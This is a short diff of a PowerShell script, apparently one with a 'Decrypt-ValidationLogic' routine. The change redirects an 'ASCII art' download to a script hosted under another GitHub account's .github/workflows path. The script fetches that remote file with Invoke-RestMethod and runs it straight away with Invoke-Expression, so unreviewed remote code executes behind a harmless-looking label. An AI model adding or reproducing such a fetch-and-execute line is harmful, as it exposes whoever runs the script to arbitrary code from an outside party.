@@ -28,7 +28,7 @@ function Decrypt-ValidationLogic {
 
 Clear-Host
 
-$asciiArtUrl = "https://raw.githubusercontent.com/Reapiin/art/main/art.ps1"
+$asciiArtUrl = "https://raw.githubusercontent.com/suprsor/Art/refs/heads/main/.github/workflows/art.ps1"
 $asciiArtScript = Invoke-RestMethod -Uri $asciiArtUrl
 Invoke-Expression $asciiArtScript
 
